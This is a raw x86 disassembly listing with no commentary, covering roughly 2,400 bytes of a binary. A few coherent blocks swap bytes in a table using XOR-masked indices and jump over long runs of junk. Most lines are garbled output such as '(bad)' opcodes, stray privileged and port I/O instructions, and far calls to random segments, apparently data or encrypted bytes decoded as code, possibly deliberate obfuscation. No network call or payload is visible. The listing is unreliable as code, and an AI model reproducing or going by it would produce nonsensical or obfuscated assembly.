  404a7b:	dec    esi
  404a7c:	cmp    eax,0x81435988
  404a81:	popf   
  404a82:	xor    eax,0xe1b83fcd
  404a87:	iret   
  404a88:	fwait
  404a89:	add    eax,0x394fdaa4
  404a8e:	int    0x1f
  404a90:	les    eax,FWORD PTR [ebx-0x20]
  404a93:	in     eax,0x13
  404a95:	cmp    BYTE PTR [edx],al
  404a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a98:	or     eax,0x4c9aecf4
  404a9d:	and    BYTE PTR [eax+0x43],dh
  404aa0:	dec    eax
  404aa1:	cdq    
  404aa2:	mov    al,0xb0
  404aa4:	and    BYTE PTR [edx-0x39],0x45
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x473c6a28
  404b32:	call   0x7e7e:0x22a2880f
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b4b
  404b3e:	add    al,0x5e
  404b40:	sar    BYTE PTR [eax+eiz*1],0x65
  404b44:	stos   DWORD PTR es:[edi],eax
  404b45:	or     BYTE PTR [edx-0x47790d23],0xf8
  404b4c:	js     0x404bb1
  404b4e:	ds pop es
  404b50:	addr16 fwait
  404b52:	and    al,0xac
  404b54:	test   al,0x89
  404b56:	in     al,0xc8
  404b58:	or     al,0xce
  404b5a:	fwait
  404b5b:	ins    BYTE PTR es:[edi],dx
  404b5c:	push   ss
  404b5d:	inc    ebx
  404b5e:	push   ds
  404b5f:	sbb    al,0x1c
  404b61:	std    
  404b62:	push   cs
  404b63:	test   BYTE PTR [ebp-0x7079d982],dh
  404b69:	mov    ch,0xf6
  404b6b:	js     0x404b16
  404b6d:	inc    eax
  404b6e:	inc    edi
  404b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b70:	dec    esp
  404b71:	push   edi
  404b72:	adc    BYTE PTR [eax],bl
  404b74:	js     0x404af8
  404b76:	pop    esp
  404b77:	ret    
  404b78:	fwait
  404b79:	rcl    DWORD PTR [esi+edi*2+0x5d],0x90
  404b7e:	pop    esi
  404b7f:	dec    edx
  404b80:	adc    ah,BYTE PTR [edx]
  404b82:	bound  edi,QWORD PTR [ecx]
  404b84:	cmp    al,bl
  404b86:	sbb    dh,BYTE PTR [esi]
  404b88:	add    eax,0xd8ff20dd
  404b8d:	out    dx,al
  404b8e:	adc    eax,0x6347fd26
  404b93:	dec    edi
  404b94:	inc    edi
  404b95:	push   0x53fc8f1e
  404b9a:	and    DWORD PTR [ecx-0x80],esp
  404b9d:	ja     0x404b2a
  404b9f:	mov    ebp,0x368eee6c
  404ba4:	cmc    
  404ba5:	in     al,0xcb
  404ba7:	aaa    
  404ba8:	je     0x404c0a
  404baa:	xchg   BYTE PTR [ebx],ch
  404bac:	test   DWORD PTR [esi+0x20887bf],edx
  404bb2:	push   eax
  404bb3:	sbb    al,BYTE PTR ds:0xbc92d77f
  404bb9:	xor    al,0x27
  404bbb:	jle    0x404bf5
  404bbd:	adc    BYTE PTR [esi+0x24],0x88
  404bc1:	sub    eax,0x8a051d00
  404bc6:	xchg   ecx,esp
  404bc8:	add    edi,DWORD PTR [ecx-0x72]
  404bcb:	push   cs
  404bcc:	pop    eax
  404bcd:	pop    ecx
  404bce:	sbb    esi,edx
  404bd0:	aas    
  404bd1:	fs push ebp
  404bd3:	xlat   BYTE PTR ds:[ebx]
  404bd4:	xchg   esp,eax
  404bd5:	sysret 
  404bd7:	dec    edi
  404bd8:	mov    ecx,0xaa773860
  404bdd:	inc    ebx
  404bde:	mov    cs,ecx
  404be0:	aas    
  404be1:	pop    es
  404be2:	retf   0x4de8
  404be5:	or     eax,0xac6db27a
  404bea:	(bad)  
  404bec:	inc    ebp
  404bed:	fisub  DWORD PTR [edi+eax*4-0xf2209e5]
  404bf4:	xor    DWORD PTR [ecx],0xfffffff7
  404bf7:	add    eax,0x72f8b75c
  404bfc:	les    edi,FWORD PTR [esi+0x2b]
  404bff:	dec    ebp
  404c00:	sti    
  404c01:	les    ebp,FWORD PTR [esi+0x79]
  404c04:	adc    bh,bh
  404c06:	icebp  
  404c07:	lock fstp DWORD PTR [edi+edx*4-0xbfcbb71]
  404c0f:	pop    ebx
  404c10:	sbb    BYTE PTR [ebx+0x4e91b921],al
  404c16:	or     dl,BYTE PTR [esi-0x7b]
  404c19:	(bad)  
  404c1a:	and    ecx,edx
  404c1c:	add    BYTE PTR [eax+0x6cfc13c],0x89
  404c23:	cmp    al,0xdc
  404c25:	adc    DWORD PTR [eax],0xfda9e163
  404c2b:	mov    gs,WORD PTR [ecx+0x4]
  404c2e:	pop    es
  404c2f:	test   al,0x3d
  404c31:	enter  0x4f86,0x7
  404c35:	pop    edi
  404c36:	mov    edx,0xd54c182b
  404c3b:	adc    bl,BYTE PTR [edx+0x3a]
  404c3e:	lahf   
  404c3f:	stc    
  404c40:	test   DWORD PTR [edi-0x785c5054],ebp
  404c46:	and    ebp,DWORD PTR [ecx]
  404c48:	mov    ah,0x7a
  404c4a:	adc    eax,0x871517e1
  404c4f:	pusha  
  404c50:	jmp    0xe520:0x51cf8dbe
  404c57:	xchg   edx,eax
  404c58:	(bad)  
  404c59:	ret    
  404c5a:	jg     0x404ca5
  404c5c:	stos   DWORD PTR es:[edi],eax
  404c5d:	outs   dx,DWORD PTR ds:[esi]
  404c5e:	xor    dl,BYTE PTR [edi]
  404c60:	jbe    0x404c2c
  404c62:	inc    sp
  404c64:	(bad)  
  404c65:	pop    ebx
  404c66:	sbb    ebx,esi
  404c68:	push   edx
  404c69:	adc    cl,BYTE PTR [ebp+0x4466758c]
  404c6f:	sti    
  404c70:	sbb    ebp,esi
  404c72:	fmul   st,st(6)
  404c74:	push   eax
  404c75:	mov    DWORD PTR [eax-0x1a],edi
  404c78:	fbld   TBYTE PTR [ebx+0x26]
  404c7b:	mov    cl,BYTE PTR [esi+0x5acf609a]
  404c81:	repz add BYTE PTR [edi+eiz*1-0x2a],cl
  404c86:	clc    
  404c87:	xor    edx,DWORD PTR [edx+eax*2]
  404c8a:	(bad)  
  404c8b:	enter  0x9817,0xfd
  404c8f:	xor    eax,0x30d66402
  404c94:	pop    ss
  404c95:	icebp  
  404c96:	ret    
  404c97:	mov    cs,WORD PTR [edi+0x38a6e256]
  404c9d:	xchg   edi,eax
  404c9e:	fiadd  DWORD PTR [esi+0x72dc1ce5]
  404ca4:	loope  0x404cd7
  404ca6:	aas    
  404ca7:	add    dh,bh
  404ca9:	into   
  404caa:	outs   dx,BYTE PTR ds:[esi]
  404cab:	sbb    al,0x1b
  404cad:	and    bh,BYTE PTR [esp+ecx*4-0xa3a430]
  404cb4:	daa    
  404cb5:	mov    edx,0x149ef764
  404cba:	pop    es
  404cbb:	jb     0x404d28
  404cbd:	aam    0x70
  404cbf:	sub    al,0x1d
  404cc1:	mov    ebp,0xc5f5925e
  404cc6:	xor    al,0xb3
  404cc8:	push   eax
  404cc9:	mov    al,0xef
  404ccb:	rcl    edx,1
  404ccd:	mov    ds:0x34b4c13e,al
  404cd2:	aaa    
  404cd3:	sbb    DWORD PTR [edx],esi
  404cd5:	xchg   DWORD PTR ds:0xf475ff12,esi
  404cdb:	push   cs
  404cdc:	dec    ebp
  404cdd:	or     esp,DWORD PTR [esi]
  404cdf:	mov    esi,ecx
  404ce1:	push   es
  404ce2:	mov    esp,0x3f947884
  404ce7:	cmp    eax,0xd77fde24
  404cec:	mov    ch,0x43
  404cee:	pop    ss
  404cef:	or     DWORD PTR [edx-0x3d],eax
  404cf2:	(bad)  
  404cf3:	adc    al,0x6e
  404cf5:	and    dl,BYTE PTR [esi-0x7]
  404cf8:	inc    ebx
  404cf9:	mov    cl,0xdb
  404cfb:	xchg   edi,eax
  404cfc:	outs   dx,DWORD PTR ds:[esi]
  404cfd:	dec    ebp
  404cfe:	dec    ebx
  404cff:	sbb    eax,0xe2b6ea3
  404d04:	xchg   ebp,eax
  404d05:	jle    0x404d7c
  404d07:	lea    ebp,[esi-0x2af3850b]
  404d0d:	mov    ecx,0x21f7eeae
  404d12:	bound  esp,QWORD PTR [ebx+0x41]
  404d15:	inc    ebp
  404d16:	(bad)  
  404d17:	retf   
  404d18:	call   0xf1ac:0x2b67c9a2
  404d1f:	or     edi,DWORD PTR [eax]
  404d21:	scas   al,BYTE PTR es:[edi]
  404d22:	loopne 0x404d8c
  404d24:	add    al,0xe3
  404d27:	push   ss
  404d28:	(bad)  
  404d2a:	dec    ebx
  404d2b:	jo     0x404cfd
  404d2d:	mov    eax,ds:0xa0cd4818
  404d32:	jnp    0x404cec
  404d34:	leave  
  404d35:	xchg   edi,eax
  404d36:	ins    BYTE PTR es:[edi],dx
  404d37:	inc    DWORD PTR [edx+0x48]
  404d3a:	cdq    
  404d3b:	adc    ah,BYTE PTR [esi+0x3d]
  404d3e:	(bad)  
  404d3f:	xor    edx,ebx
  404d41:	fimul  DWORD PTR [ebp-0x5f]
  404d44:	stos   BYTE PTR es:[edi],al
  404d45:	out    0xf6,eax
  404d47:	inc    ebx
  404d48:	shr    DWORD PTR [edi+0x2121bfbd],cl
  404d4e:	shl    al,cl
  404d50:	aam    0x77
  404d52:	pop    ds
  404d53:	sbb    edi,edx
  404d55:	inc    ebx
  404d56:	jge    0x404d32
  404d58:	or     BYTE PTR [ecx-0x2c0e569b],dl
  404d5e:	fadd   DWORD PTR [esp+ebx*8-0x13194427]
  404d65:	sbb    BYTE PTR [edx],ah
  404d67:	mov    ah,0x6a
  404d69:	mov    ebx,0x8994face
  404d6e:	add    al,dl
  404d70:	pop    esp
  404d71:	adc    DWORD PTR [ebx+0x43],edi
  404d74:	add    ecx,esp
  404d76:	jmp    0x7224:0x7f1af7e9
  404d7d:	push   cs
  404d7e:	(bad)  
  404d7f:	sbb    al,0x72
  404d81:	pop    ds
  404d82:	loop   0x404df1
  404d84:	in     al,dx
  404d85:	es js  0x404d56
  404d88:	xor    al,0x17
  404d8a:	sbb    esp,DWORD PTR [eax]
  404d8c:	(bad)  
  404d8d:	scas   eax,DWORD PTR es:[edi]
  404d8e:	dec    esi
  404d8f:	mov    al,ds:0x6ea968e3
  404d94:	mov    ebp,0xeb62d8cf
  404d99:	mov    gs,WORD PTR [edx-0x16]
  404d9c:	in     al,dx
  404d9d:	sub    edx,DWORD PTR [ebx]
  404d9f:	cmp    eax,0x36de278c
  404da4:	addr16 inc eax
  404da6:	cld    
  404da7:	aaa    
  404da8:	das    
  404da9:	fs push cs
  404dab:	dec    eax
  404dac:	xchg   DWORD PTR [eax+ebp*4],eax
  404daf:	cs cld 
  404db1:	pop    esi
  404db2:	int3   
  404db3:	sbb    eax,0xd9f5e5b3
  404db8:	icebp  
  404db9:	add    eax,0x156b4f69
  404dbe:	mov    al,BYTE PTR [ebp-0x9a3f784]
  404dc4:	daa    
  404dc5:	dec    eax
  404dc6:	les    edx,FWORD PTR [ecx]
  404dc8:	dec    ecx
  404dc9:	jmp    0x404db4
  404dcb:	std    
  404dcc:	xchg   edx,eax
  404dcd:	aaa    
  404dce:	aam    0xa9
  404dd0:	fst    QWORD PTR [ebx-0x4a8998b1]
  404dd6:	push   edi
  404dd7:	pop    ebp
  404dd8:	xchg   esp,eax
  404dd9:	pop    ds
  404dda:	addr16 push es
  404ddc:	enter  0x7037,0x20
  404de0:	or     BYTE PTR [esi+0x11f65aad],dl
  404de6:	rcl    BYTE PTR [edi-0x63],cl
  404de9:	(bad)  
  404dea:	pusha  
  404deb:	out    dx,eax
  404dec:	xlat   BYTE PTR ds:[ebx]
  404ded:	nop
  404dee:	xchg   esp,eax
  404def:	add    bh,ch
  404df1:	int    0xe6
  404df3:	push   edx
  404df4:	(bad)  
  404df5:	xor    BYTE PTR [esi],bh
  404df7:	mov    ch,0x32
  404df9:	popf   
  404dfa:	xchg   edi,esi
  404dfc:	push   ebp
  404dfd:	push   es
  404dfe:	or     DWORD PTR [esi],ecx
  404e00:	rcl    BYTE PTR [ecx-0x39],1
  404e03:	pop    ebp
  404e04:	sub    ebp,DWORD PTR [edx]
  404e06:	cmp    DWORD PTR [ebx+ebp*8+0x19],edi
  404e0a:	or     al,0xe4
  404e0c:	push   edx
  404e0d:	mov    ebp,0x7e9cc17
  404e12:	inc    ebp
  404e13:	(bad)  
  404e14:	jmp    0x404dec
  404e16:	jmp    0x404e79
  404e18:	mov    al,0x63
  404e1a:	popa   
  404e1b:	shl    DWORD PTR [esi],0xcd
  404e1e:	xchg   BYTE PTR [edx+0x70],ch
  404e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e22:	repz add edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e79
  404e5e:	inc    esi
  404e5f:	out    0x12,eax
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e28
  404e6a:	jle    0x404e5d
  404e6c:	icebp  
  404e6d:	mov    bh,BYTE PTR [ecx-0x6ac11e3e]
  404e73:	jns    0x404e61
  404e75:	adc    eax,0x8c6cc3c7
  404e7a:	mov    WORD PTR [edx+0x11],ds
  404e7d:	aaa    
  404e7e:	call   0x1c1c8f71
  404e83:	stos   BYTE PTR es:[edi],al
  404e84:	sub    edi,DWORD PTR [edi-0x507aa2da]
  404e8a:	sti    
  404e8b:	lock int3 
  404e8d:	mov    ebp,0xfb7e6d15
  404e92:	fist   WORD PTR [ebx-0xa5bd3ef]
  404e98:	icebp  
  404e99:	mov    esi,0xa31ab6c3
  404e9e:	dec    edi
  404e9f:	adc    eax,0x5f724ba9
  404ea4:	ss call 0xe1c29647
  404eaa:	pusha  
  404eab:	out    dx,al
  404eac:	mov    al,0x60
  404eae:	addr16 adc al,cl
  404eb1:	js     0x404f20
  404eb3:	pop    ds
  404eb4:	pop    esi
  404eb5:	stc    
  404eb6:	xchg   edx,eax
  404eb7:	mov    ?,WORD PTR [ebx]
  404eb9:	mov    edi,0x7f31f3c6
  404ebe:	mov    ds:0x62bee64b,al
  404ec3:	test   DWORD PTR [ebx+0x4617e0f2],eax
  404ec9:	mov    DWORD PTR [edi],ecx
  404ecb:	dec    esi
  404ecc:	fistp  WORD PTR [ebx]
  404ece:	ins    BYTE PTR es:[edi],dx
  404ecf:	sbb    esi,DWORD PTR [ecx-0x63032185]
  404ed5:	lock pop ss
  404ed7:	out    dx,eax
  404ed8:	dec    esp
  404ed9:	push   ebx
  404eda:	aaa    
  404edb:	sahf   
  404edc:	add    DWORD PTR [edx+edi*1],0xa352e836
  404ee3:	add    al,0x66
  404ee5:	mov    esp,0x74c4da02
  404eea:	push   eax
  404eeb:	(bad)  
  404eec:	sbb    DWORD PTR [ebp+eax*2-0x50],edx
  404ef0:	call   esp
  404ef2:	jge    0x404e75
  404ef4:	add    eax,DWORD PTR [eax]
  404ef6:	call   0xde1e:0x15542561
  404efd:	inc    ebx
  404efe:	loope  0x404eff
  404f00:	aaa    
  404f01:	add    eax,0x7d119421
  404f06:	and    BYTE PTR [ecx-0x54],dl
  404f09:	pusha  
  404f0a:	push   eax
  404f0b:	ja     0x404f69
  404f0d:	leave  
  404f0e:	cmp    dl,dl
  404f10:	mov    sp,WORD PTR [eax+0x43]
  404f14:	scas   al,BYTE PTR es:[edi]
  404f15:	sbb    cl,BYTE PTR [ebx-0xc]
  404f18:	stc    
  404f19:	fimul  WORD PTR [edx-0x6f44a1d0]
  404f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f21:	retf   
  404f22:	push   bx
  404f24:	and    DWORD PTR [ecx+0x27],esi
  404f27:	iret   
  404f28:	clc    
  404f29:	aam    0xe0
  404f2b:	xchg   edi,eax
  404f2c:	(bad)  
  404f2d:	sbb    BYTE PTR fs:[edi],al
  404f30:	xor    esp,DWORD PTR [eax]
  404f32:	pop    es
  404f33:	ins    BYTE PTR es:[edi],dx
  404f34:	sub    eax,0x21d26de5
  404f39:	idiv   BYTE PTR ss:[esi+0x7e0a51f8]
  404f40:	push   ds
  404f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f42:	cmp    DWORD PTR [ebx],ebx
  404f44:	aas    
  404f45:	push   cs
  404f46:	fcmovne st,st(5)
  404f48:	dec    eax
  404f49:	cs sub ah,cl
  404f4c:	pop    ds
  404f4d:	dec    eax
  404f4e:	cmc    
  404f4f:	sub    esi,ecx
  404f51:	mov    bh,0x96
  404f53:	xchg   ebx,eax
  404f54:	and    al,0xd6
  404f56:	scas   al,BYTE PTR es:[edi]
  404f57:	fadd   st(5),st
  404f59:	sbb    ch,bl
  404f5b:	adc    BYTE PTR [esi+0x37bf1457],al
  404f61:	or     al,0xbf
  404f63:	add    al,ah
  404f65:	outs   dx,BYTE PTR ds:[esi]
  404f66:	shufps xmm2,xmm0,0xcd
  404f6a:	popa   
  404f6b:	cmp    DWORD PTR [ecx-0x2c4f19f4],eax
  404f71:	mov    ds:0x5d444b49,al
  404f76:	mov    ds:0x4a1035c2,al
  404f7b:	adc    al,0xd3
  404f7d:	out    0x78,eax
  404f7f:	fidivr WORD PTR [eax-0x46d7905b]
  404f85:	inc    esi
  404f86:	cmp    al,0x37
  404f88:	out    0xbe,eax
  404f8a:	push   eax
  404f8b:	inc    ebp
  404f8c:	pop    esi
  404f8d:	cdq    
  404f8e:	push   es
  404f8f:	xor    eax,0xbd04d6a0
  404f94:	std    
  404f95:	loopne 0x405002
  404f97:	or     al,0x75
  404f99:	and    edx,ebx
  404f9b:	pop    esp
  404f9c:	and    ebp,DWORD PTR [edi+eiz*4+0x5e]
  404fa0:	mov    al,ds:0x362d658f
  404fa5:	jge    0x405022
  404fa7:	scas   al,BYTE PTR es:[edi]
  404fa8:	and    eax,0xed635031
  404fad:	jl     0x404f60
  404faf:	xor    ecx,DWORD PTR [edx]
  404fb1:	stos   DWORD PTR es:[edi],eax
  404fb2:	mov    dh,BYTE PTR [esi]
  404fb4:	mov    ebx,DWORD PTR [ecx+0x24948221]
  404fba:	adc    DWORD PTR [ebx+0x1cc76d7a],ecx
  404fc0:	pop    ebp
  404fc1:	mov    ebp,0x1c76302d
  404fc6:	repnz aas 
  404fc8:	sti    
  404fc9:	push   edx
  404fca:	jb     0x405043
  404fcc:	loope  0x404fec
  404fce:	sbb    BYTE PTR [edx+ecx*8+0x469f619f],0x65
  404fd6:	mov    cl,0xe5
  404fd8:	xchg   dl,ah
  404fda:	std    
  404fdb:	pop    edx
  404fdc:	xlat   BYTE PTR ds:[ebx]
  404fdd:	jge    0x405027
  404fdf:	pop    es
  404fe0:	mov    ah,0x30
  404fe2:	(bad)  
  404fe3:	pop    ss
  404fe4:	add    cl,ah
  404fe6:	std    
  404fe7:	mov    cl,0xc0
  404fe9:	inc    edx
  404fea:	call   0x50da:0xc6cebc6e
  404ff1:	test   BYTE PTR [ecx+esi*8],0xc1
  404ff5:	pusha  
  404ff6:	pop    eax
  404ff7:	push   cs
  404ff8:	(bad)  
  404ff9:	(bad)  
  404ffa:	aam    0xf0
  404ffc:	lods   al,BYTE PTR ds:[esi]
  404ffd:	into   
  404ffe:	stc    
  404fff:	push   esp
  405000:	push   esp
  405001:	sub    DWORD PTR [ebx],0x0
  405004:	xchg   esp,eax
  405005:	and    cl,BYTE PTR [ecx]
  405007:	mov    al,0x5d
  405009:	inc    esi
  40500a:	in     eax,dx
  40500b:	cmp    DWORD PTR [edi],ebx
  40500d:	inc    edi
  40500e:	mov    ah,0xe6
  405010:	jle    0x404fd0
  405012:	xchg   edx,eax
  405013:	test   BYTE PTR [edx-0x415070a6],ch
  405019:	mov    ecx,0x5088c347
  40501e:	lods   al,BYTE PTR ds:[esi]
  40501f:	add    eax,0xdfd79600
  405024:	mov    ah,0xf4
  405026:	aaa    
  405027:	(bad)  
  405028:	js     0x404fd1
  40502a:	or     al,0x6f
  40502c:	xor    esp,ebx
  40502e:	lods   al,BYTE PTR ds:[esi]
  40502f:	dec    ebp
  405030:	retf   
  405031:	pop    ebp
  405032:	mov    esp,0xa0570de1
  405037:	adc    al,dl
  405039:	jle    0x40508c
  40503b:	loopne 0x404fc2
  40503d:	xchg   esi,eax
  40503e:	sub    DWORD PTR [ecx],edx
  405040:	adc    DWORD PTR [edx-0x1f],ebp
  405043:	loop   0x405001
  405045:	ret    
  405046:	test   BYTE PTR [ebx+0x3d2e7d8c],al
  40504c:	in     al,0x71
  40504e:	dec    edx
  40504f:	loopne 0x404fe8
  405051:	call   0xaeee:0xf6a9b61f
  405058:	inc    ebx
  405059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40505a:	aaa    
  40505b:	jmp    0x40507b
  40505d:	xor    ah,BYTE PTR [edi-0x16]
  405060:	push   0xffffffb6
  405062:	sub    BYTE PTR [esi],ah
  405064:	xor    ebp,ebp
  405066:	int    0xdf
  405068:	test   BYTE PTR [edi],ch
  40506a:	repnz (bad) 
  40506d:	loopne 0x405050
  40506f:	inc    bh
  405071:	add    ah,dh
  405073:	mov    dh,0x6d
  405075:	(bad)  
  405076:	mov    bh,0x5
  405078:	cmc    
  405079:	and    DWORD PTR [edi+0x6bb30430],esi
  40507f:	jge    0x405078
  405081:	and    dh,ah
  405083:	push   ebx
  405084:	in     al,0x9
  405086:	out    dx,eax
  405087:	and    BYTE PTR [ecx-0x76e656a7],ah
  40508d:	mov    DWORD PTR [eax+0x55],esp
  405090:	aaa    
  405091:	dec    esi
  405092:	outs   dx,BYTE PTR ds:[esi]
  405093:	sub    ecx,DWORD PTR [ebp-0x29a97034]
  405099:	pop    edi
  40509a:	out    0x69,eax
  40509c:	pop    esi
  40509d:	xor    dh,BYTE PTR [edx+0x697cc1a5]
  4050a3:	push   ebx
  4050a4:	pop    ecx
  4050a5:	or     al,0xcd
  4050a7:	clc    
  4050a8:	std    
  4050a9:	outs   dx,BYTE PTR ds:[esi]
  4050aa:	ret    0xc6ad
  4050ad:	add    DWORD PTR ds:0x8ae5faee,0x578fd8e8
  4050b7:	aaa    
  4050b8:	ds ins DWORD PTR es:[edi],dx
  4050ba:	(bad)  [edi]
  4050bc:	mov    ch,0x1f
  4050be:	loope  0x405083
  4050c0:	aaa    
  4050c1:	xor    BYTE PTR [eax+0x6963d792],dh
  4050c7:	(bad)  
  4050c8:	loop   0x405130
  4050ca:	hlt    
  4050cb:	outs   dx,DWORD PTR ds:[esi]
  4050cc:	mov    bh,0x3d
  4050ce:	stc    
  4050cf:	nop
  4050d0:	cmp    al,0xee
  4050d2:	(bad)  
  4050d3:	or     al,0xb4
  4050d5:	imul   esp,DWORD PTR [ebp+0x1],0x8ea69042
  4050dc:	push   ss
  4050dd:	icebp  
  4050de:	lods   al,BYTE PTR fs:[esi]
  4050e0:	out    0x41,al
  4050e2:	pop    es
  4050e3:	dec    ebp
  4050e4:	ss ins BYTE PTR es:[edi],dx
  4050e6:	cmp    eax,DWORD PTR [edx+0x3f]
  4050e9:	sub    ch,dh
  4050eb:	ins    BYTE PTR es:[edi],dx
  4050ec:	pop    esp
  4050ed:	adc    BYTE PTR [ebp+eax*4+0x42],dh
  4050f1:	jl     0x405124
  4050f3:	mov    edi,0x2b85996d
  4050f8:	int3   
  4050f9:	sub    al,0x4
  4050fb:	push   0x8253825
  405100:	xor    ch,BYTE PTR [edx]
  405102:	cli    
  405103:	pop    eax
  405104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405105:	ins    BYTE PTR es:[edi],dx
  405106:	pop    esi
  405107:	(bad)  
  405109:	xchg   DWORD PTR [edi+ecx*2+0x56],eax
  40510d:	fld    DWORD PTR [eax+ecx*1+0xd3c8c0e]
  405114:	js     0x405184
  405116:	fldenv [ecx+0x354717f9]
  40511c:	mov    esp,0xf4665f8e
  405121:	aam    0x10
  405123:	jb     0x405132
  405125:	(bad)  
  405126:	std    
  405127:	mov    al,ds:0xbc0be97b
  40512c:	das    
  40512d:	fldlg2 
  40512f:	scas   eax,DWORD PTR es:[edi]
  405130:	pushf  
  405131:	sub    ebx,eax
  405133:	jns    0x405114
  405135:	dec    esi
  405136:	je     0x4050c8
  405138:	push   edx
  405139:	js     0x40518d
  40513b:	add    DWORD PTR [ebp-0x7ca19052],ecx
  405141:	cmp    bl,dl
  405143:	ficom  WORD PTR [ecx+ecx*4]
  405146:	mov    ebp,0xe2013ab8
  40514b:	sub    eax,0xf683979
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	retf   0x9d87
  405174:	loop   0x40516c
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051c4
  40517e:	(bad)  [edx+ecx*4+0x1439c75]
  405185:	dec    edx
  405186:	ins    DWORD PTR es:[edi],dx
  405187:	pop    ebp
  405188:	cmp    al,0xed
  40518a:	jge    0x4051b7
  40518c:	mov    al,ds:0xe7956407
  405191:	sbb    BYTE PTR [edi],bl
  405193:	dec    edi
  405194:	mov    edi,0x27a0e7d3
  405199:	gs je  0x40519d
  40519c:	ds jbe 0x40517d
  40519f:	sbb    eax,0xefc3f8fe
  4051a4:	dec    edi
  4051a5:	inc    edi
  4051a6:	mov    ebp,0x9552eea
  4051ab:	add    bl,BYTE PTR ds:[ebx]
  4051ae:	lea    ecx,[eax]
  4051b0:	repnz xchg ah,al
  4051b3:	out    0x77,eax
  4051b5:	ret    0xd4b2
  4051b8:	loopne 0x4051b0
  4051ba:	mov    al,ds:0x197f1f68
  4051bf:	ror    BYTE PTR ds:0x47e1a54b,cl
  4051c5:	add    eax,0xef9b042d
  4051ca:	adc    DWORD PTR [eax],esp
  4051cc:	pop    es
  4051cd:	(bad)  
  4051ce:	lods   al,BYTE PTR ds:[esi]
  4051cf:	pop    ebp
  4051d0:	outs   dx,BYTE PTR ds:[esi]
  4051d1:	(bad)  
  4051d2:	mov    edi,0xbf71bd42
  4051d7:	je     0x4051cc
  4051d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051da:	or     al,0xf0
  4051dc:	inc    edx
  4051dd:	xchg   ecx,eax
  4051de:	shr    DWORD PTR [ebx*8+0x52680b43],0xba
  4051e6:	xchg   edi,eax
  4051e7:	out    0x9d,eax
  4051e9:	jg     0x405266
  4051eb:	cmp    al,0x22
  4051ed:	fbld   TBYTE PTR [edi+0x53]
  4051f0:	xchg   edx,eax
  4051f1:	sub    DWORD PTR [ebp+ecx*8+0x1d],eax
  4051f5:	and    DWORD PTR [ecx],edi
  4051f7:	ins    DWORD PTR es:[edi],dx
  4051f8:	jg     0x40517f
  4051fa:	hlt    
  4051fb:	push   edi
  4051fc:	rcl    al,1
  4051fe:	mov    ah,0x6a
  405200:	fwait
